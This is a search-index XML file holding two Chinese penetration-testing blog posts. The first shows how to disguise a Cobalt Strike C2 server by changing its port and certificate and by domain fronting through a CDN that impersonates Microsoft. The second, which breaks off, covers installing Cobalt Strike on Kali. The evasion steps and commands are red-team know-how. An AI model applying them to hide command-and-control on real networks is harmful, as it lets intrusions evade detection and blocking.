<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>如何隐蔽你的C2</title>
      <link href="2021/02/24/ru-he-yin-bi-ni-de-c2/"/>
      <url>2021/02/24/ru-he-yin-bi-ni-de-c2/</url>
      
        <content type="html"><![CDATA[<p>在红蓝对抗中，如果攻击者不通过手段隐藏C2服务器，这样可能导致C2被溯源以及被反撸。以下内容讲述如何通过手段隐蔽C2。</p><h1 id="端口特征修改"><a href="#端口特征修改" class="headerlink" title="端口特征修改"></a>端口特征修改</h1><p>CobaltStrike的连接端口默认为50050，这是个很明显的特征。要想修改这个默认端口，我们可以修改teamserver文件，将50050端口改成任意其他端口均可。</p><p><a href="https://p1.ssl.qhimg.com/t0124bd80cb7acddb87.png"><img src="/2021/02/24/ru-he-yin-bi-ni-de-c2/1645596324541-d95c405a-6d30-480c-8e1d-6bfe4ead5cdd.png" alt="img"></a></p><h1 id="证书特征修改"><a href="#证书特征修改" class="headerlink" title="证书特征修改"></a>证书特征修改</h1><p>Keytool是一个java数据证书的管理工具，Keytool将密钥 和 证书 存放在一个称为 keystore 的文件中,即.store后缀的文件中。</p><p>Keystore是什么？keystore是java的密钥库，用来进行通信加密，如数字签名。keystore就是用来保存密钥对的公钥和私钥。Keystore可理解为一个数据库，可以存放很多个组数据。</p><p>每组数据主要包含以下两种数据:</p><ul><li>密钥实体：密钥(secret key)又或者私钥和配对公钥(采用非对称加密)</li><li>可信任的证书实体：只包含共钥</li></ul><p><img src="/2021/02/24/ru-he-yin-bi-ni-de-c2/1645604516654-4a108930-fe92-4f62-bdc4-4ed83ed66bcb.png" alt="img"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">查看证书文件：keytool <span class="token operator">-</span><span class="token builtin">list</span> <span class="token operator">-</span>v <span class="token operator">-</span>keystore xx<span class="token punctuation">.</span>store修改证书密码：keytool <span class="token operator">-</span>storepasswd <span class="token operator">-</span>keystore xx<span class="token punctuation">.</span>store修改keystore的alias别名：keytool <span class="token operator">-</span>changealias <span class="token operator">-</span>keystore xx<span class="token punctuation">.</span>store <span class="token operator">-</span>alias source_name <span class="token operator">-</span>destalias new_name修改alias（别名）的密码：keytool <span class="token operator">-</span>keypasswd <span class="token operator">-</span>keystore xx<span class="token punctuation">.</span>store <span class="token operator">-</span>alias source_name<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>keystore</strong></p><p>查看CobaltStrike的默认store文件</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">keytool <span class="token operator">-</span><span class="token builtin">list</span> <span class="token operator">-</span>v <span class="token operator">-</span>keystore cobaltstrike<span class="token punctuation">.</span>store<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/02/24/ru-he-yin-bi-ni-de-c2/1645600478394-52c7270b-c934-416b-9537-a239718eb8ff.png" alt="img"></p><p>可以看出CobaltStrike默认的store文件中的Alias name 、Onwer 和 Issuer 的信息，特征都比较明显。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">Alias name<span class="token punctuation">:</span> cobaltstrikeOnwer<span class="token punctuation">:</span> CN<span class="token operator">=</span>Major Cobalt Strike<span class="token punctuation">,</span> OU<span class="token operator">=</span>AdvancedPenTesting<span class="token punctuation">,</span> O<span class="token operator">=</span>cobaltstrike<span class="token punctuation">,</span> L<span class="token operator">=</span>Somewhere<span class="token punctuation">,</span> ST<span class="token operator">=</span>Cyberspace<span class="token punctuation">,</span> C<span class="token operator">=</span>EarthIssuer<span class="token punctuation">:</span> CN<span class="token operator">=</span>Major Cobalt Strike<span class="token punctuation">,</span> OU<span class="token operator">=</span>AdvancedPenTesting<span class="token punctuation">,</span> O<span class="token operator">=</span>cobaltstrike<span class="token punctuation">,</span> L<span class="token operator">=</span>Somewhere<span class="token punctuation">,</span> ST<span class="token operator">=</span>Cyberspace<span class="token punctuation">,</span> C<span class="token operator">=</span>Earth<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>通过直接访问CobaltStrike服务器的端口，也可以看到证书信息。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">curl https<span class="token punctuation">:</span><span class="token operator">//</span><span class="token number">10.211</span><span class="token number">.55</span><span class="token number">.2</span><span class="token punctuation">:</span><span class="token number">62345</span> <span class="token operator">-</span>v <span class="token operator">-</span>k<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/02/24/ru-he-yin-bi-ni-de-c2/1645600508000-1593a2be-1d8f-4c1e-8079-b84d7efda7ec.png" alt="img"></p><p>使用浏览器访问也可以看到提示证书无效</p><p><img src="/2021/02/24/ru-he-yin-bi-ni-de-c2/1645600566819-4662a6d8-05c7-49dd-83d9-ea5652368a49.png" alt="img"></p><p>而百度这类正常域名则可以看到证书有效</p><p><img src="/2021/02/24/ru-he-yin-bi-ni-de-c2/1645600609157-c6f28e51-803c-41de-9c38-93b5d8fa60d1.png" alt="img"></p><h2 id="修改服务端证书CobaltStrike-store"><a href="#修改服务端证书CobaltStrike-store" class="headerlink" title="修改服务端证书CobaltStrike.store"></a>修改服务端证书CobaltStrike.store</h2><p>服务器端使用的证书CobaltStrike.store，为了掩盖默认SSL证书存在的特征，需要重新创建一个新的不一样的证书 。使用以下命令创建证书：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">keytool <span class="token operator">-</span>keystore cobaltstrike<span class="token punctuation">.</span>store <span class="token operator">-</span>storepass 密码 <span class="token operator">-</span>keypass 密码 <span class="token operator">-</span>genkey <span class="token operator">-</span>keyalg RSA <span class="token operator">-</span>alias google<span class="token punctuation">.</span>com <span class="token operator">-</span>dname <span class="token string">"CN=(名字与姓氏), OU=(组织单位名称), O=(组织名称), L=(城市或区域名称), ST=(州或省份名称), C=(单位的两字母国家代码)"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>-alias 指定别名</li><li>-storepass pass 和 -keypass pass 指定密钥</li><li>-keyalg 指定算法</li><li>-dname 指定所有者信息</li></ul><p>先删除 CobaltStrike 自带的 cobaltstrike.store，然后使用以下命令生成一个新的 cobaltstrike.store 即可！</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">keytool <span class="token operator">-</span>keystore cobaltstrike<span class="token punctuation">.</span>store <span class="token operator">-</span>storepass <span class="token number">123456</span> <span class="token operator">-</span>keypass <span class="token number">123456</span> <span class="token operator">-</span>genkey <span class="token operator">-</span>keyalg RSA <span class="token operator">-</span>alias baidu<span class="token punctuation">.</span>com <span class="token operator">-</span>dname <span class="token string">"CN=(名字与姓氏), OU=(组织单位名称), O=(组织名称), L=(城市或区域名称), ST=(州或省份名称), C=(单位的两字母国家代码)"</span>keytool <span class="token operator">-</span>importkeystore <span class="token operator">-</span>srckeystore cobaltstrike<span class="token punctuation">.</span>store <span class="token operator">-</span>destkeystore cobaltstrike<span class="token punctuation">.</span>store <span class="token operator">-</span>deststoretype pkcs12<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2021/02/24/ru-he-yin-bi-ni-de-c2/1645604610678-f570639e-b169-467a-8250-d049e78b0e05.png" alt="img"></p><p>再次访问可以看到证书信息已经很明显的改变了</p><p><img src="/2021/02/24/ru-he-yin-bi-ni-de-c2/1645604685967-e5e2bb38-47c0-4947-82fc-0665736a82f5.png" alt="img"></p><p>但是由于是自签名的证书，故还是提示证书无效。</p><p><img src="/2021/02/24/ru-he-yin-bi-ni-de-c2/1645604743452-f230e9e1-a9bf-4deb-bff9-965c5d1dbd25.png" alt="img"></p><h2 id="修改上线的证书"><a href="#修改上线的证书" class="headerlink" title="修改上线的证书"></a>修改上线的证书</h2><p>cobaltStrike.store 仅仅是服务器端连接的证书。通过https上线使用的证书，不是 cobaltstrike.store，并且，该证书也是默认的！</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">subject<span class="token punctuation">:</span> C<span class="token operator">=</span><span class="token punctuation">;</span> ST<span class="token operator">=</span><span class="token punctuation">;</span> L<span class="token operator">=</span><span class="token punctuation">;</span> O<span class="token operator">=</span><span class="token punctuation">;</span> OU<span class="token operator">=</span><span class="token punctuation">;</span> CN<span class="token operator">=</span>issuer<span class="token punctuation">:</span>  C<span class="token operator">=</span><span class="token punctuation">;</span> ST<span class="token operator">=</span><span class="token punctuation">;</span> L<span class="token operator">=</span><span class="token punctuation">;</span> O<span class="token operator">=</span><span class="token punctuation">;</span> OU<span class="token operator">=</span><span class="token punctuation">;</span> CN<span class="token operator">=</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>查看监听的https端口证书，可以看出证书值都是空的</p><p><img src="/2021/02/24/ru-he-yin-bi-ni-de-c2/1645604966026-ff25efae-2047-4a18-815b-3808d680571e.png" alt="img"></p><p>如果想要修改这个证书，需要修改Malleable C2 profile。详情看官方文档：<a href="https://www.cobaltstrike.com/help-malleable-c2">https://www.cobaltstrike.com/help-malleable-c2</a></p><p>Self-signed Certificates with SSL Beacon 和 Valid SSL Certificates with SSL Beacon 这两个都是用来修改https上线使用的证书的。</p><ul><li>Self-signed Certificates with SSL Beacon 这里是自己设定的自签名证书。</li><li>Valid SSL Certificates with SSL Beacon 这里是叫我们使用有效的证书。我们可以使用之前修改过的cobaltstrike.store，也可以使用从其他地方弄过来的证书</li></ul><p><a href="https://img-blog.csdnimg.cn/20201218162652908.png"><img src="/2021/02/24/ru-he-yin-bi-ni-de-c2/1645596331439-1e494f9a-d96c-4fb4-a719-bbc57170cf53.png" alt="img"></a></p><p>我们可以在启动CobaltStrike的时候，指定一个profile文件，然后在文件中配置上线时使用的证书文件即可修改上线时默认的证书。如下，我们在profile文件中指定https上线证书也是cobaltstrike.store</p><p><img src="/2021/02/24/ru-he-yin-bi-ni-de-c2/1645605075113-859fb0da-65fd-4af7-a142-32eddc1495fb.png" alt="img"></p><p>然后在启动CobaltStrike时指定该profile文件，再次探测上线端口，可以看到证书信息变了</p><p><img src="/2021/02/24/ru-he-yin-bi-ni-de-c2/1645605133544-3afb9834-ef35-4071-88e5-5d3628f61e13.png" alt="img"></p><h1 id="流量特征修改"><a href="#流量特征修改" class="headerlink" title="流量特征修改"></a>流量特征修改</h1><p>流量特征修改使用域前置技术，域前置是一种用于隐藏真实C2服务器IP且同时能伪装为与高信誉域名通信的技术，多用于木马受控端和控制端之间的隐蔽通信。</p><p>简言之，利用该技术，可以让受控端以为程序是在和一个高信誉域名通信，但实际上却是在和我们的C2服务器进行通信，效果如下：</p><p><a href="https://img-blog.csdnimg.cn/20210211103220446.png"><img src="/2021/02/24/ru-he-yin-bi-ni-de-c2/1645596333454-8d04000d-0eef-4d46-9dac-c175691593c2.png" alt="img"></a></p><h2 id="SNI域前置"><a href="#SNI域前置" class="headerlink" title="SNI域前置"></a>SNI域前置</h2><h3 id="申请配置CDN"><a href="#申请配置CDN" class="headerlink" title="申请配置CDN"></a>申请配置CDN</h3><p>正常情况下，第一步我们要做的是先申请一个域名（这个域名的作用是用来配合 CDN 来隐藏我们的C2服务器），然后再申请一个CDN对我们所申请的域名进行加速，在这个过程中CDN会要求我们在域名的解析配置中设置相应的 CNAME。</p><p>但由于某云有一个有趣的特点：当 CDN 配置中的源 IP 为自己云服务器时，加速时会跳过对域名的检验，直接与配置中的域名绑定的源服务器IP进行通信。利用该特性，我们不需要去申请域名，也不需要配置该域名的CNAME记录了。换言之，只要我们的C2服务器属于某云的服务器，那么我们就无需申请域名，只需要在申请 CDN 时随便填一个没有人绑定过的域名就行，而且这个域名我们可以填成任何高信誉的域名，例如 test.microsoft.com、wwws.microsoft.com 等。</p><p>接下来我们直接去申请 CDN 即可，这里我把域名填为 wwws.microsoft.com。这里端口80和443端口。80端口流量是不加密的，443端口流量是加密的。</p><p>这里需要注意的是：</p><ul><li>如果是443端口，则后面的 Listener 得是windows&#x2F;beacon_https&#x2F;reverse_https</li><li>如果是80端口，则后面的 Listener 得是windows&#x2F;beacon_http&#x2F;reverse_http</li></ul><p><a href="https://img-blog.csdnimg.cn/20210211103418902.png"><img src="/2021/02/24/ru-he-yin-bi-ni-de-c2/1645596333416-8458314a-3680-470f-a427-b2fcbb9de1e4.png" alt="img"></a></p><p>然后下一步即可配置CDN完成</p><p><a href="https://img-blog.csdnimg.cn/20210211103452659.png"><img src="/2021/02/24/ru-he-yin-bi-ni-de-c2/1645596333936-34a7d33c-547d-434a-88d1-50e507b0e2fb.png" alt="img"></a></p><p>最终结果如下</p><p><a href="https://img-blog.csdnimg.cn/2021021110360310.png"><img src="/2021/02/24/ru-he-yin-bi-ni-de-c2/1645596334294-9de061fd-2237-4dcf-ae17-4659f68cb54c.png" alt="img"></a></p><h3 id="配置CS-profile文件"><a href="#配置CS-profile文件" class="headerlink" title="配置CS profile文件"></a>配置CS profile文件</h3><p>CDN 申请完成后，就可以开始编辑 Cobalt Strike 要用到的 C2 Profile 文件了，我们直接使用开源项目 Malleable-C2-Profiles 中的 <a href="https://github.com/rsmudge/Malleable-C2-Profiles/blob/master/normal/amazon.profile">amazon.profile</a>，但需要把其中的 Host 头改成我们自己在 CDN 中绑定的域名，如图：</p><p><a href="https://img-blog.csdnimg.cn/20210211103659428.png"><img src="/2021/02/24/ru-he-yin-bi-ni-de-c2/1645596335067-c34fd689-6266-4076-a004-47fe2fbedbc6.png" alt="img"></a></p><p>然后启动CobaltStrike服务端，加载该profile文件</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">.</span><span class="token operator">/</span>teamserver C2ip 密码 xx<span class="token punctuation">.</span>profile <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><a href="https://img-blog.csdnimg.cn/20210211103753137.png"><img src="/2021/02/24/ru-he-yin-bi-ni-de-c2/1645596335599-1defb23f-3cca-4ff1-b087-33f0215b5274.png" alt="img"></a></p><h3 id="开启Listener"><a href="#开启Listener" class="headerlink" title="开启Listener"></a>开启Listener</h3><h4 id="使用ip作为Hosts"><a href="#使用ip作为Hosts" class="headerlink" title="使用ip作为Hosts"></a>使用ip作为Hosts</h4><p>以下HTTPS Host(Stager)</p><p><a href="https://img-blog.csdnimg.cn/20210211103905482.png"><img src="/2021/02/24/ru-he-yin-bi-ni-de-c2/1645596335798-b011fa37-6dcf-4136-9565-584335efc34f.png" alt="img"></a></p><p>配置完成后如图</p><p><a href="https://img-blog.csdnimg.cn/20210211104039834.png"><img src="/2021/02/24/ru-he-yin-bi-ni-de-c2/1645596336152-8cb28aa0-f68e-41c3-bd2e-1af17f5dd39f.png" alt="img"></a></p><p>打开web日志试图，请求CDN服务器ip然后指定Host头部，可以看到web日志有响应</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">curl <span class="token number">125</span><span class="token punctuation">.</span>xx<span class="token punctuation">.</span>xx<span class="token punctuation">.</span>xx <span class="token operator">-</span>H <span class="token string">"Host:wwws.microsoft.com"</span> <span class="token operator">-</span>v <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><a href="https://img-blog.csdnimg.cn/20210211104128790.png"><img src="/2021/02/24/ru-he-yin-bi-ni-de-c2/1645596337661-b4b4c346-1b16-494a-9233-a47dfca2b58d.png" alt="img"></a></p><h4 id="使用域名作为Hosts"><a href="#使用域名作为Hosts" class="headerlink" title="使用域名作为Hosts"></a>使用域名作为Hosts</h4><p>以下HTTPS Host(Stager)</p><p><a href="https://img-blog.csdnimg.cn/20210211104221362.png"><img src="/2021/02/24/ru-he-yin-bi-ni-de-c2/1645596337188-22733982-7172-440a-87bc-3718b4a1c67f.png" alt="img"></a></p><p>配置完成如图</p><p><a href="https://img-blog.csdnimg.cn/20210211104329728.png"><img src="/2021/02/24/ru-he-yin-bi-ni-de-c2/1645596337291-b6ea82b8-6488-4fcd-9b1e-2d35f1e907a1.png" alt="img"></a></p><p>打开web日志试图，请求CDN服务器ip然后指定Host头部，可以看到web日志有响应</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">curl xx<span class="token punctuation">.</span>xx<span class="token punctuation">.</span>com <span class="token operator">-</span>H <span class="token string">"Host:wwws.microsoft.com"</span> <span class="token operator">-</span>v <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><a href="https://img-blog.csdnimg.cn/20210211104443869.png"><img src="/2021/02/24/ru-he-yin-bi-ni-de-c2/1645596338359-c65e1040-4edb-4a3b-ad40-ca86ecbd9621.png" alt="img"></a></p><h3 id="生成木马上线"><a href="#生成木马上线" class="headerlink" title="生成木马上线"></a>生成木马上线</h3><p>使用各种方式均可上线。这里我们使用Scripted Web Delivery(S)上线</p><p><a href="https://img-blog.csdnimg.cn/20210211104517697.png"><img src="/2021/02/24/ru-he-yin-bi-ni-de-c2/1645596337954-762527c1-9945-401b-9d69-9222080061fa.png" alt="img"></a></p><p>然后在目标机器执行命令上线，可以看到，CS上显示该机器的外部ip为某云的ip，并且该ip是动态变化的。</p><p><a href="https://img-blog.csdnimg.cn/2021021110473074.png"><img src="/2021/02/24/ru-he-yin-bi-ni-de-c2/1645596338529-a09c3d1a-e209-4309-bff3-3837c409142c.png" alt="img"></a></p><p><a href="https://img-blog.csdnimg.cn/2021021111143657.png"><img src="/2021/02/24/ru-he-yin-bi-ni-de-c2/1645596338971-e891906d-56cb-44b5-9823-43a4633afbcc.png" alt="img"></a></p><p>如果想要上线显示其真正的ip，修改profile文件中的trust_x_forwarded_for为true即可。</p><p><a href="https://img-blog.csdnimg.cn/20210211105113777.png"><img src="/2021/02/24/ru-he-yin-bi-ni-de-c2/1645596339277-5598a156-4265-4f98-a12b-a2c4d1809db4.png" alt="img"></a></p><p>在目标机器上执行 netstat -ano 命令查看端口连接，只能看到该机器与某云CDN的ip进行连接，即使封锁了该ip，仍然会与CDN其他ip进行连接，这样就永远无法阻断与C2服务器的连接了</p><p><a href="https://img-blog.csdnimg.cn/20210211105149878.png"><img src="/2021/02/24/ru-he-yin-bi-ni-de-c2/1645596340165-d1d9063d-3edc-413e-a7e2-364c9a93a7a2.png" alt="img"></a></p><p>并且使用 wireshark 抓包，可以看到访问的是我们在申请CDN时配置的 wwws.microsoft.com 这个高信任域名。(如下的包得是配置80端口才能抓到，443端口流量加密的抓取不到)</p><p><a href="https://img-blog.csdnimg.cn/20210211105251444.png"><img src="/2021/02/24/ru-he-yin-bi-ni-de-c2/1645596341075-89b11854-712c-4626-b8b9-8785362ad956.png" alt="img"></a></p><p>并且不会与我们的C2服务器真实ip进行通信</p><p><a href="https://img-blog.csdnimg.cn/20210211105315982.png"><img src="/2021/02/24/ru-he-yin-bi-ni-de-c2/1645596340227-07853b9b-0f47-4693-840c-07094816a9d8.png" alt="img"></a></p><p>最终上线流程图</p><p><a href="https://img-blog.csdnimg.cn/20210211105350816.png"><img src="/2021/02/24/ru-he-yin-bi-ni-de-c2/1645596341036-ba03bd43-831b-4f74-8de1-56499dc61cb4.png" alt="img"></a></p><p>通过比较ip作为Hosts和域名作为Hosts，可以发现两者各有优势。</p><ul><li>使用ip作为Hosts：ip是全国各地正常的ip，但是证书不可信</li><li>使用域名作为Hosts：证书可信，但是域名是解析到某云CDN的域名，这样容易被发现</li></ul><h2 id="ESNI域前置"><a href="#ESNI域前置" class="headerlink" title="ESNI域前置"></a>ESNI域前置</h2><p>以下仅限于使用域名作为Hosts，使用ip作为Hosts不用考虑这些。</p><p>在HTTP(S)请求中，目标域名通常显示在三个关键位置：DNS查询，TLS（SNI）拓展及HTTP主机头中。通常，这三个地方都会是我们要访问的域名地址，然而，在”Domain Fronting”请求中，DNS查询以及SNI携带了一个域名（前域），而在HTTP host头中携带了另一个域名（隐蔽的，被禁止访问的域名），简单的图例如下：</p><p><a href="https://img-blog.csdnimg.cn/20181123153848916.png"><img src="/2021/02/24/ru-he-yin-bi-ni-de-c2/1645596340719-1acc9f9d-0ec3-49f2-9575-dc52d76a484a.png" alt="img"></a></p><p><a href="https://img-blog.csdnimg.cn/20210211105553707.png"><img src="/2021/02/24/ru-he-yin-bi-ni-de-c2/1645596341943-dd006516-7ecb-406f-85be-2178104b3e1e.png" alt="img"></a></p><p><a href="https://img-blog.csdnimg.cn/20210211105620131.png"><img src="/2021/02/24/ru-he-yin-bi-ni-de-c2/1645596342383-0f6fe7de-1669-44aa-bca4-575aee237f6a.png" alt="img"></a></p><h3 id="ESNI"><a href="#ESNI" class="headerlink" title="ESNI"></a>ESNI</h3><p>TLS是网络通讯的安全基础（HTTPS）。TLS提供的认证加密使得用户可以确定他们在与谁通讯， 并确保通讯信息不被中间人看到或篡改。 虽然TLS可以隐藏用户通讯的内容，但其并不能总是隐藏与用户通讯的对象。 比如TLS握手可以携带一个叫做加密服务器名称指示（SNI）的扩展, 这个扩展帮助客户端告诉服务器其想要访问的网站的域名。 包括x国在内的审查者利用这一扩展来检查并阻止用户访问特定的网站。</p><p>TLS1.3引入了加密SNI（ESNI）。 简而言之就是用加密了的SNI阻止中间人查看客户端要访问的特定网站。 （更多ESNI的益处请见Cloudflare的介绍文章<a href="https://blog.cloudflare.com/encrypted-sni/">https://blog.cloudflare.com/encrypted-sni/</a> ）。 ESNI有让审查HTTPS流量变得更加困难的潜能; 因为不知道用户使用ESNI访问的网站，审查者要么不封锁任何ESNI连接，要么封锁所有的ESNI连接。</p><p>以下是DefCON28大会分享的议题： Domain Fronting is Dead，Long Live Domain Fronting：Using TLS 1.3 to Evade Censors，Bypass Network Defenses，and Blend in With the Noise <a href="https://www.youtube.com/watch?v=TDg092qe50g&amp;t=646s">https://www.youtube.com/watch?v=TDg092qe50g&amp;t=646s</a></p><p><a href="https://img-blog.csdnimg.cn/20210211105653173.png"><img src="/2021/02/24/ru-he-yin-bi-ni-de-c2/1645596342961-3586854f-3680-4275-b90a-4bb8bbd80527.png" alt="img"></a></p><p>但是目前我们国内使用不了ESNI域前置，因为xx防火墙会把所有ESNI的流量包都给丢弃。</p><p>github上的一些ESNI域前置的项目：</p><ul><li><a href="https://github.com/SixGenInc/Noctilucent">https://github.com/SixGenInc/Noctilucent</a></li><li><a href="https://github.com/Ridter/DomainHiding">https://github.com/Ridter/DomainHiding</a></li></ul><p>参考文章： <a href="https://www.anquanke.com/post/id/195011#h2-2">https://www.anquanke.com/post/id/195011#h2-2</a></p><p><a href="https://mp.weixin.qq.com/s/5MWDXN3eCaw9m-XHDGaXcQ">https://mp.weixin.qq.com/s/5MWDXN3eCaw9m-XHDGaXcQ</a></p>]]></content>
      
      
      <categories>
          
          <category> 技术文章2 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CobaltStrike的使用</title>
      <link href="2019/12/19/cobaltstrike-de-shi-yong/"/>
      <url>2019/12/19/cobaltstrike-de-shi-yong/</url>
      
        <content type="html"><![CDATA[<h1 id="CobaltStrike"><a href="#CobaltStrike" class="headerlink" title="CobaltStrike"></a>CobaltStrike</h1><p><strong>CobaltStrike</strong>是一款渗透测试神器，被业界人称为CS神器。CobaltStrike分为客户端与服务端，服务端是一个，客户端可以有多个，可被团队进行分布式协团操作。</p><p>CobaltStrike集成了端口转发、服务扫描，自动化溢出，多模式端口监听，windows exe 木马生成，windows dll 木马生成，java 木马生成，office 宏病毒生成，木马捆绑。钓鱼攻击包括：站点克隆，目标信息获取，java 执行，浏览器自动攻击等等强大的功能！</p><h1 id="CobaltStrike的安装"><a href="#CobaltStrike的安装" class="headerlink" title="CobaltStrike的安装"></a>CobaltStrike的安装</h1><p>我这里以Kali安装为例： </p><pre class="line-numbers language-python" data-language="python"><code class="language-python">上传到Kali中，解压：tar <span class="token operator">-</span>xzvf jdk<span class="token operator">-</span>8u191<span class="token operator">-</span>linux<span class="token operator">-</span>x64<span class="token punctuation">.</span>tar<span class="token punctuation">.</span>gz移动到opt目录下： mv jdk1<span class="token punctuation">.</span><span class="token number">8.0_191</span><span class="token operator">/</span> <span class="token operator">/</span>opt<span class="token operator">/</span>进入jdk目录：cd  <span class="token operator">/</span>opt<span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">8.0_191</span>执行 vim  <span class="token operator">~</span><span class="token operator">/</span><span class="token punctuation">.</span>bashrc ， 并添加下列内容<span class="token comment"># install JAVA JDK</span>export JAVA_HOME<span class="token operator">=</span><span class="token operator">/</span>opt<span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">8.0_191</span>export CLASSPATH<span class="token operator">=</span><span class="token punctuation">.</span><span class="token punctuation">:</span>$<span class="token punctuation">&#123;</span>JAVA_HOME<span class="token punctuation">&#125;</span><span class="token operator">/</span>libexport PATH<span class="token operator">=</span>$<span class="token punctuation">&#123;</span>JAVA_HOME<span class="token punctuation">&#125;</span><span class="token operator">/</span><span class="token builtin">bin</span><span class="token punctuation">:</span>$PATH保存退出执行<span class="token punctuation">:</span> source <span class="token operator">~</span><span class="token operator">/</span><span class="token punctuation">.</span>bashrc执行：update<span class="token operator">-</span>alternatives <span class="token operator">-</span><span class="token operator">-</span>install <span class="token operator">/</span>usr<span class="token operator">/</span><span class="token builtin">bin</span><span class="token operator">/</span>java java <span class="token operator">/</span>opt<span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">8.0_191</span><span class="token operator">/</span><span class="token builtin">bin</span><span class="token operator">/</span>java <span class="token number">1</span>update<span class="token operator">-</span>alternatives <span class="token operator">-</span><span class="token operator">-</span>install <span class="token operator">/</span>usr<span class="token operator">/</span><span class="token builtin">bin</span><span class="token operator">/</span>javac javac <span class="token operator">/</span>opt<span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">8.0_191</span><span class="token operator">/</span><span class="token builtin">bin</span><span class="token operator">/</span>javac <span class="token number">1</span>update<span class="token operator">-</span>alternatives <span class="token operator">-</span><span class="token operator">-</span><span class="token builtin">set</span> java <span class="token operator">/</span>opt<span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">8.0_191</span><span class="token operator">/</span><span class="token builtin">bin</span><span class="token operator">/</span>javaupdate<span class="token operator">-</span>alternatives <span class="token operator">-</span><span class="token operator">-</span><span class="token builtin">set</span> javac <span class="token operator">/</span>opt<span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">8.0_191</span><span class="token operator">/</span><span class="token builtin">bin</span><span class="token operator">/</span>javac查看结果：update<span class="token operator">-</span>alternatives <span class="token operator">-</span><span class="token operator">-</span>config javaupdate<span class="token operator">-</span>alternatives <span class="token operator">-</span><span class="token operator">-</span>config javac<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078004855-50ca2c2e-29eb-4b60-b131-aaa1d8d97a7b-20220401150223675.png" alt="img"></p><p>安装好了java之后，我们就去安装CobalStrike了！</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">上传到Kali中，解压：unzip cobaltstrike<span class="token operator">-</span>linux<span class="token punctuation">.</span><span class="token builtin">zip</span>进入cobalstrike中：cd cobaltstrike<span class="token operator">-</span>linux<span class="token operator">/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>启动服务端：</strong></p><p>CobaltStrike一些主要文件功能如下：</p><ul><li>agscript：扩展应用的脚本</li><li>c2lint：用于检查profile的错误和异常</li><li>teamserver：服务器端启动程序</li><li>cobaltstrike.jar：CobaltStrike核心程序</li><li>cobaltstrike.auth：用于客户端和服务器端认证的文件，客户端和服务端有一个一模一样的</li><li>cobaltstrike.store：秘钥证书存放文件</li></ul><p>一些目录作用如下：</p><ul><li>data：用于保存当前TeamServer的一些数据</li><li>download：用于存放在目标机器下载的数据</li><li>upload：上传文件的目录</li><li>logs：日志文件，包括Web日志、Beacon日志、截图日志、下载日志、键盘记录日志等</li><li>third-party：第三方工具目录</li></ul><p>对于客户端来说，保存账号密码的文件如下：</p><ul><li>~&#x2F;.aggressor.prop</li></ul><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078005144-5c45d978-8017-40d9-91c4-0d7244674764-20220401150224278.png" alt="img"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">启动服务端： <span class="token punctuation">.</span><span class="token operator">/</span>teamserver   <span class="token number">192.168</span><span class="token number">.10</span><span class="token number">.11</span>  <span class="token number">123456</span>    <span class="token comment">#192.168.10.11是kali的ip地址，123456是密码</span>后台运行，关闭当前终端依然运行：nohup  <span class="token punctuation">.</span><span class="token operator">/</span>teamserver   <span class="token number">192.168</span><span class="token number">.10</span><span class="token number">.11</span>  <span class="token number">123456</span>  <span class="token operator">&amp;</span>这里CobaltStrike默认监听的是<span class="token number">50050</span>端口，如果我们想修改这个默认端口的话，可以打开teamserver文件，将其中的<span class="token number">50050</span>修改成任意一个端口号<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078005822-8b8a9d12-e81c-4376-a9c5-e144d26c3baf-20220401150233310.png" alt="img"></p><p><strong>启动客户端：</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">.</span><span class="token operator">/</span>cobaltstrike<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里host填kali的ip，密码就是刚刚我们启动的密码。 </p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078005486-e96b293b-be5f-42c4-b518-55e3a7110998-20220401150230043.png" alt="img"></p><p>启动后的客户端：</p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078004451-9cd405e0-26af-469e-821b-76996a9effa1-20220401150223486.png" 